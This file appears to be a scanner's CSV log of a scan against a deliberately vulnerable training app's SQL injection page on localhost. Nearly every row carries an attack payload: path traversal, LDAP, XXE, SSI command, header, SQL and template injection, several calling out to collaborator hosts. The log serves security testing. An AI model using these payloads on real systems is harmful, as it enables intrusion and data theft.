Number,Complete,Tool,Host,Method,Path,Query,Params,Status,ResponseLength,MimeType,UrlExtension,Comment,IsSSL,NewCookies,RequestTime,ResponseTime,ResponseDelay,ListenerInterface,Regex1Req,Regex1Resp,
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/,id=test&Submit=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd&user_token=6b2cbb17116e9b5a09437842c00311f6,true,302,0,HTML,,,false,,2018/05/16 00:28:14,2018/05/16 00:28:14,260ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/,id=test&Submit=%2fetc%2fpasswd&user_token=6b2cbb17116e9b5a09437842c00311f6,true,302,0,HTML,,,false,,2018/05/16 00:28:14,2018/05/16 00:28:14,266ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/,id=test&Submit=Submit..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd&user_token=6b2cbb17116e9b5a09437842c00311f6,true,302,0,HTML,,,false,,2018/05/16 00:28:14,2018/05/16 00:28:14,271ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/,id=test&Submit=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00Submit&user_token=6b2cbb17116e9b5a09437842c00311f6,true,302,0,HTML,,,false,,2018/05/16 00:28:14,2018/05/16 00:28:14,278ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/,id=test&Submit=...%2fSubmit&user_token=6b2cbb17116e9b5a09437842c00311f6,true,302,0,HTML,,,false,,2018/05/16 00:28:14,2018/05/16 00:28:14,285ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/,id=test&Submit=7dsrw81kf2)(objectClass%3d*&user_token=6b2cbb17116e9b5a09437842c00311f6,true,302,0,HTML,,,false,,2018/05/16 00:28:14,2018/05/16 00:28:14,299ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/,id=test&Submit=rtg7r2ghxx)(!(objectClass%3d*)&user_token=6b2cbb17116e9b5a09437842c00311f6,true,302,0,HTML,,,false,,2018/05/16 00:28:14,2018/05/16 00:28:14,310ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/,id=test&Submit=*)(objectClass%3d*&user_token=6b2cbb17116e9b5a09437842c00311f6,true,302,0,HTML,,,false,,2018/05/16 00:28:14,2018/05/16 00:28:14,318ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/,id=test&Submit=*)(!(objectClass%3d*)&user_token=6b2cbb17116e9b5a09437842c00311f6,true,302,0,HTML,,,false,,2018/05/16 00:28:14,2018/05/16 00:28:14,327ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/,id=test&Submit=%3ckzw%20xmlns%3d%22http%3a%2f%2fa.b%2f%22%20xmlns%3axsi%3d%22http%3a%2f%2fwww.w3.org%2f2001%2fXMLSchema-instance%22%20xsi%3aschemaLocation%3d%22http%3a%2f%2fa.b%2f%20http%3a%2f%2fayc3q1h5nqixtyv24iku966m2d86w6kx7ovd.burpcollaborator.net%2fkzw.xsd%22%3ekzw%3c%2fkzw%3e&user_token=6b2cbb17116e9b5a09437842c00311f6,true,302,0,HTML,,,false,,2018/05/16 00:28:14,2018/05/16 00:28:14,335ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/index.php,,false,200,6400,HTML,php,,false,,2018/05/16 00:28:14,2018/05/16 00:28:14,343ms,,Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/,id=test&Submit=%3cizn%20xmlns%3axi%3d%22http%3a%2f%2fwww.w3.org%2f2001%2fXInclude%22%3e%3cxi%3ainclude%20href%3d%22http%3a%2f%2fexf7p5g9muh1s2u63mjy8a5q1h7avbj26tui.burpcollaborator.net%2ffoo%22%2f%3e%3c%2fizn%3e&user_token=6b2cbb17116e9b5a09437842c00311f6,true,302,0,HTML,,,false,,2018/05/16 00:28:14,2018/05/16 00:28:14,350ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/index.php,,false,200,5300,HTML,php,,false,,2018/05/16 00:28:14,2018/05/16 00:28:14,357ms,,Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/,id=test&Submit=Submit]]%3e%3e%3c&user_token=6b2cbb17116e9b5a09437842c00311f6,true,302,0,HTML,,,false,,2018/05/16 00:28:14,2018/05/16 00:28:14,365ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/,id=test&Submit=Submit'%2b(function()%7bif(typeof%20tec9p%3d%3d%3d%22undefined%22)%7bvar%20a%3dnew%20Date()%3bdo%7bvar%20b%3dnew%20Date()%3b%7dwhile(b-a%3c20000)%3btec9p%3d1%3b%7d%7d())%2b'&user_token=6b2cbb17116e9b5a09437842c00311f6,true,302,0,HTML,,,false,,2018/05/16 00:28:14,2018/05/16 00:28:14,376ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/,id=test&Submit=%22--%3e'--%3e%60--%3e%3c!--%23set%20var%3d%226b7%22%20value%3d%225a6y2wt0zl%22--%3e%3c!--%23set%20var%3d%228d9%22%20value%3d%227c804yv21n%22--%3e%3c!--%23echo%20var%3d%226b7%22--%3e%3c!--%23echo%20var%3d%228d9%22--%3e%3c!--%23exec%20cmd%3d%22nslookup%20-q%3dcname%20sxtlpjgnm8hfsguk30jc8o541v7ovgt4krbf0.burpcollaborator.net%22%20--%3e&user_token=6b2cbb17116e9b5a09437842c00311f6,true,302,0,HTML,,,false,,2018/05/16 00:28:14,2018/05/16 00:28:14,384ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/index.php,,false,200,5400,HTML,php,,false,,2018/05/16 00:28:14,2018/05/16 00:28:14,391ms,,Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/,id=test&Submit=Submit%0d%0aBCC%3ao7whzfqjw4rb2c4gdwt8ikf0brhk5cy0pngb5@burpcollaborator.net%0d%0akry%3a%20d&user_token=6b2cbb17116e9b5a09437842c00311f6,true,302,0,HTML,,,false,,2018/05/16 00:28:14,2018/05/16 00:28:14,402ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/,id=test&Submit=Submit%3e%0d%0aBCC%3a5u0ymwd0jlesptrx0dgp512hy841stmhd44st@burpcollaborator.net%0d%0albx%3a%20k&user_token=6b2cbb17116e9b5a09437842c00311f6,true,302,0,HTML,,,false,,2018/05/16 00:28:14,2018/05/16 00:28:14,411ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/,id=test&Submit=Submit&user_token=vctyc5znfu,true,302,0,HTML,,,false,,2018/05/16 00:28:14,2018/05/16 00:28:14,422ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/index.php,,false,200,5400,HTML,php,,false,,2018/05/16 00:28:14,2018/05/16 00:28:14,428ms,,Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/,id=test&Submit=Submit&user_token=6b2cbb17116e9b5a09437842c00311f60cqcj3bdya,true,302,0,HTML,,,false,,2018/05/16 00:28:14,2018/05/16 00:28:14,434ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/index.php,,false,200,5300,HTML,php,,false,,2018/05/16 00:28:14,2018/05/16 00:28:14,460ms,,Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/,id=test&Submit=Submit&user_token=(select%20extractvalue(xmltype('%3c%3fxml%20version%3d%221.0%22%20encoding%3d%22UTF-8%22%3f%3e%3c!DOCTYPE%20root%20[%20%3c!ENTITY%20%25%20gznpx%20SYSTEM%20%22http%3a%2f%2firdbj9adgyb5m6oaxqd22ezuvl1ephd800op.burpcollab'%7c%7c'orator.net%2f%22%3e%25gznpx%3b]%3e')%2c'%2fl')%20from%20dual),true,302,0,HTML,,,false,,2018/05/16 00:28:14,2018/05/16 00:28:14,477ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/index.php,,false,200,5300,HTML,php,,false,,2018/05/16 00:28:14,2018/05/16 00:28:14,483ms,,Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/,id=test&Submit=Submit&user_token=6b2cbb17116e9b5a09437842c00311f6'%7c%7c(select%20extractvalue(xmltype('%3c%3fxml%20version%3d%221.0%22%20encoding%3d%22UTF-8%22%3f%3e%3c!DOCTYPE%20root%20[%20%3c!ENTITY%20%25%20gznpx%20SYSTEM%20%22http%3a%2f%2fyuwrmpdtjeelpmrq06gi5u2ay14usygp3hr6.burpcollab'%7c%7c'orator.net%2f%22%3e%25gznpx%3b]%3e')%2c'%2fl')%20from%20dual)%7c%7c',true,302,0,HTML,,,false,,2018/05/16 00:28:14,2018/05/16 00:28:14,490ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/index.php,,false,200,5300,HTML,php,,false,,2018/05/16 00:28:14,2018/05/16 00:28:14,495ms,,Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/,id=test&Submit=Submit&user_token=6b2cbb17116e9b5a09437842c00311f6%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5c8w51ozf3logvrwt02gis744k0b64uvkjb63us.burpcollab'%2b'orator.net%5clco'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20,true,302,0,HTML,,,false,,2018/05/16 00:28:14,2018/05/16 00:28:14,503ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/index.php,,false,200,5300,HTML,php,,false,,2018/05/16 00:28:14,2018/05/16 00:28:14,509ms,,Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/,id=test&Submit=Submit&user_token=6b2cbb17116e9b5a09437842c00311f6'%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5c5lrydw40al5sgtixrd7pw1thp8v1jsag13tri.burpcollab'%2b'orator.net%5cang'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20,true,302,0,HTML,,,false,,2018/05/16 00:28:14,2018/05/16 00:28:14,516ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/index.php,,false,200,5300,HTML,php,,false,,2018/05/16 00:28:14,2018/05/16 00:28:14,523ms,,Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/,id=test&Submit=Submit&user_token=6b2cbb17116e9b5a09437842c00311f6)%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5c8r01jza3gobvmwo0xgds24zkvb14pvhj860up.burpcollab'%2b'orator.net%5crol'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20,true,302,0,HTML,,,false,,2018/05/16 00:28:14,2018/05/16 00:28:14,531ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/index.php,,false,200,5300,HTML,php,,false,,2018/05/16 00:28:14,2018/05/16 00:28:14,537ms,,Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/,id=test&Submit=Submit&user_token=6b2cbb17116e9b5a09437842c00311f6')%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5cm0nfsdjhp2k9vaxe6um6bi8y4paiy9rxika8z.burpcollab'%2b'orator.net%5cecm'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20,true,302,0,HTML,,,false,,2018/05/16 00:28:14,2018/05/16 00:28:14,544ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/index.php,,false,200,5300,HTML,php,,false,,2018/05/16 00:28:14,2018/05/16 00:28:14,550ms,,Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/,id=test&Submit=Submit&user_token=(select%20load_file('%5c%5c%5c%5czuxsmqdujfempnrr07gj5v2by24vsmualxdl2.burpcollaborator.net%5c%5cqel')),true,302,0,HTML,,,false,,2018/05/16 00:28:14,2018/05/16 00:28:14,557ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/index.php,,false,200,5300,HTML,php,,false,,2018/05/16 00:28:14,2018/05/16 00:28:14,562ms,,Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/,id=test&Submit=Submit&user_token=6b2cbb17116e9b5a09437842c00311f6'%2b(select%20load_file('%5c%5c%5c%5ctfcm7kyo49zgahcll11dqpn5jwppdgg47rzfo.burpcollaborator.net%5c%5cxhe'))%2b',true,302,0,HTML,,,false,,2018/05/16 00:28:14,2018/05/16 00:28:14,570ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/index.php,,false,200,5300,HTML,php,,false,,2018/05/16 00:28:14,2018/05/16 00:28:14,576ms,,Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/,id=test&Submit=Submit&user_token=6b2cbb17116e9b5a09437842c00311f6',true,302,0,HTML,,,false,,2018/05/16 00:28:14,2018/05/16 00:28:14,582ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/index.php,,false,200,5300,HTML,php,,false,,2018/05/16 00:28:14,2018/05/16 00:28:14,587ms,,Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/,id=test&Submit=Submit&user_token=6b2cbb17116e9b5a09437842c00311f6'(select*from(select(sleep(20)))a)',true,302,0,HTML,,,false,,2018/05/16 00:28:14,2018/05/16 00:28:14,595ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/,id=test&Submit=Submit&user_token=6b2cbb17116e9b5a09437842c00311f6'%2b(select*from(select(sleep(20)))a)%2b',true,302,0,HTML,,,false,,2018/05/16 00:28:14,2018/05/16 00:28:14,603ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/,id=test&Submit=Submit&user_token=6b2cbb17116e9b5a09437842c00311f6'%20and%20(select*from(select(sleep(20)))a)--%20,true,302,0,HTML,,,false,,2018/05/16 00:28:14,2018/05/16 00:28:14,611ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/,id=test&Submit=Submit&user_token=6b2cbb17116e9b5a09437842c00311f6%2c(select*from(select(sleep(20)))a),true,302,0,HTML,,,false,,2018/05/16 00:28:14,2018/05/16 00:28:14,617ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/,id=test&Submit=Submit&user_token=6b2cbb17116e9b5a09437842c00311f6'%20waitfor%20delay'0%3a0%3a20'--,true,302,0,HTML,,,false,,2018/05/16 00:28:14,2018/05/16 00:28:14,624ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/,id=test&Submit=Submit&user_token=6b2cbb17116e9b5a09437842c00311f6')waitfor%20delay'0%3a0%3a20'--,true,302,0,HTML,,,false,,2018/05/16 00:28:14,2018/05/16 00:28:14,630ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/,id=test&Submit=Submit&user_token=6b2cbb17116e9b5a09437842c00311f6'%2c0)waitfor%20delay'0%3a0%3a20'--,true,302,0,HTML,,,false,,2018/05/16 00:28:14,2018/05/16 00:28:14,636ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/,id=test&Submit=Submit&user_token=6b2cbb17116e9b5a09437842c00311f612510457'%20or%20'9063'%3d'9063,true,302,0,HTML,,,false,,2018/05/16 00:28:14,2018/05/16 00:28:14,644ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/index.php,,false,200,5650,HTML,php,,false,,2018/05/16 00:28:14,2018/05/16 00:28:14,651ms,,Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/,id=test&Submit=Submit&user_token=6b2cbb17116e9b5a09437842c00311f616306841'%20or%20'7435'%3d'7433,true,302,0,HTML,,,false,,2018/05/16 00:28:14,2018/05/16 00:28:14,659ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/index.php,,false,200,5300,HTML,php,,false,,2018/05/16 00:28:14,2018/05/16 00:28:14,664ms,,Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/,id=test&Submit=Submit&user_token=6b2cbb17116e9b5a09437842c00311f613397730'%20or%20'4504'%3d'4504,true,302,0,HTML,,,false,,2018/05/16 00:28:14,2018/05/16 00:28:14,675ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/index.php,,false,200,5300,HTML,php,,false,,2018/05/16 00:28:14,2018/05/16 00:28:14,683ms,,Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/,id=test&Submit=Submit&user_token=6b2cbb17116e9b5a09437842c00311f617094451'%20or%20'5259'%3d'5259',true,302,0,HTML,,,false,,2018/05/16 00:28:14,2018/05/16 00:28:14,692ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/index.php,,false,200,5300,HTML,php,,false,,2018/05/16 00:28:14,2018/05/16 00:28:14,699ms,,Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/,id=test&Submit=Submit&user_token=6b2cbb17116e9b5a09437842c00311f617528003'%20or%202088%3d2088--%20,true,302,0,HTML,,,false,,2018/05/16 00:28:14,2018/05/16 00:28:14,709ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/index.php,,false,200,5300,HTML,php,,false,,2018/05/16 00:28:14,2018/05/16 00:28:14,717ms,,Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/,id=test&Submit=Submit&user_token=6b2cbb17116e9b5a09437842c00311f616352288'%20or%208462%3d8455--%20,true,302,0,HTML,,,false,,2018/05/16 00:28:14,2018/05/16 00:28:14,728ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/index.php,,false,200,5300,HTML,php,,false,,2018/05/16 00:28:14,2018/05/16 00:28:14,735ms,,Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/,id=test&Submit=Submit&user_token=6b2cbb17116e9b5a09437842c00311f621329224'%20or%209107%3d9107--%20,true,302,0,HTML,,,false,,2018/05/16 00:28:14,2018/05/16 00:28:14,746ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/index.php,,false,200,5300,HTML,php,,false,,2018/05/16 00:28:14,2018/05/16 00:28:14,753ms,,Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/,id=test&Submit=Submit&user_token=6b2cbb17116e9b5a09437842c00311f615314113'%20or%208014%3d8014'--%20,true,302,0,HTML,,,false,,2018/05/16 00:28:14,2018/05/16 00:28:14,763ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/index.php,,false,200,5300,HTML,php,,false,,2018/05/16 00:28:14,2018/05/16 00:28:14,773ms,,Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/,id=test&Submit=Submit&user_token=6b2cbb17116e9b5a09437842c00311f6'%20and%20'8877'%3d'8877,true,302,0,HTML,,,false,,2018/05/16 00:28:14,2018/05/16 00:28:14,783ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/index.php,,false,200,5300,HTML,php,,false,,2018/05/16 00:28:14,2018/05/16 00:28:14,787ms,,Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/,id=test&Submit=Submit&user_token=6b2cbb17116e9b5a09437842c00311f6'%20and%20'7204'%3d'7202,true,302,0,HTML,,,false,,2018/05/16 00:28:14,2018/05/16 00:28:14,795ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/index.php,,false,200,5300,HTML,php,,false,,2018/05/16 00:28:14,2018/05/16 00:28:14,802ms,,Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/,id=test&Submit=Submit&user_token=6b2cbb17116e9b5a09437842c00311f6'%20and%20'6884'%3d'6884,true,302,0,HTML,,,false,,2018/05/16 00:28:14,2018/05/16 00:28:14,811ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/index.php,,false,200,5300,HTML,php,,false,,2018/05/16 00:28:14,2018/05/16 00:28:14,817ms,,Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/,id=test&Submit=Submit&user_token=6b2cbb17116e9b5a09437842c00311f6'%20and%20'6834'%3d'6834',true,302,0,HTML,,,false,,2018/05/16 00:28:14,2018/05/16 00:28:14,826ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/index.php,,false,200,5300,HTML,php,,false,,2018/05/16 00:28:14,2018/05/16 00:28:14,834ms,,Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/,id=test&Submit=Submit&user_token=6b2cbb17116e9b5a09437842c00311f6'%20and%208633%3d8633--%20,true,302,0,HTML,,,false,,2018/05/16 00:28:14,2018/05/16 00:28:14,845ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/index.php,,false,200,5300,HTML,php,,false,,2018/05/16 00:28:14,2018/05/16 00:28:14,856ms,,Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/,id=test&Submit=Submit&user_token=6b2cbb17116e9b5a09437842c00311f6'%20and%202640%3d2636--%20,true,302,0,HTML,,,false,,2018/05/16 00:28:14,2018/05/16 00:28:14,865ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/index.php,,false,200,5300,HTML,php,,false,,2018/05/16 00:28:14,2018/05/16 00:28:14,870ms,,Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/,id=test&Submit=Submit&user_token=6b2cbb17116e9b5a09437842c00311f6'%20and%208983%3d8983--%20,true,302,0,HTML,,,false,,2018/05/16 00:28:14,2018/05/16 00:28:14,880ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/index.php,,false,200,5300,HTML,php,,false,,2018/05/16 00:28:14,2018/05/16 00:28:14,886ms,,Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/,id=test&Submit=Submit&user_token=6b2cbb17116e9b5a09437842c00311f6'%20and%204420%3d4420'--%20,true,302,0,HTML,,,false,,2018/05/16 00:28:14,2018/05/16 00:28:14,895ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/index.php,,false,200,5300,HTML,php,,false,,2018/05/16 00:28:14,2018/05/16 00:28:14,902ms,,Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/,id=test&Submit=Submit&user_token=6b2cbb17116e9b5a09437842c00311f6%22,true,302,0,HTML,,,false,,2018/05/16 00:28:14,2018/05/16 00:28:14,911ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/index.php,,false,200,5300,HTML,php,,false,,2018/05/16 00:28:14,2018/05/16 00:28:14,918ms,,Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/,id=test&Submit=Submit&user_token=bz0t3$%7b224*477%7davtk4,true,302,0,HTML,,,false,,2018/05/16 00:28:14,2018/05/16 00:28:14,930ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/index.php,,false,200,5300,HTML,php,,false,,2018/05/16 00:28:14,2018/05/16 00:28:14,936ms,,Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/,id=test&Submit=Submit&user_token=qspsy%7b%7b675*994%7d%7dw8lyx,true,302,0,HTML,,,false,,2018/05/16 00:28:14,2018/05/16 00:28:14,943ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/index.php,,false,200,5300,HTML,php,,false,,2018/05/16 00:28:14,2018/05/16 00:28:14,951ms,,Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/,id=test&Submit=Submit&user_token=6b2cbb17116e9b5a09437842c00311f6%7d%7dw3j7n'%2f%22%3cs6eat,true,302,0,HTML,,,false,,2018/05/16 00:28:14,2018/05/16 00:28:14,978ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/index.php,,false,200,5300,HTML,php,,false,,2018/05/16 00:28:14,2018/05/16 00:28:14,989ms,,Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/,id=test&Submit=Submit&user_token=6b2cbb17116e9b5a09437842c00311f6%25%7dshpwa'%2f%22%3cypkfx,true,302,0,HTML,,,false,,2018/05/16 00:28:14,2018/05/16 00:28:14,997ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/index.php,,false,200,5300,HTML,php,,false,,2018/05/16 00:28:15,2018/05/16 00:28:15,10ms,,Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/,id=test&Submit=Submit&user_token=6b2cbb17116e9b5a09437842c00311f6necr5%25%3edqg7h'%2f%22%3cwlkms,true,302,0,HTML,,,false,,2018/05/16 00:28:15,2018/05/16 00:28:15,19ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/index.php,,false,200,5300,HTML,php,,false,,2018/05/16 00:28:15,2018/05/16 00:28:15,24ms,,Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/,id=test&Submit=Submit&user_token=6b2cbb17116e9b5a09437842c00311f6'%2bsleep(20.to_i)%2b',true,302,0,HTML,,,false,,2018/05/16 00:28:15,2018/05/16 00:28:15,43ms,,
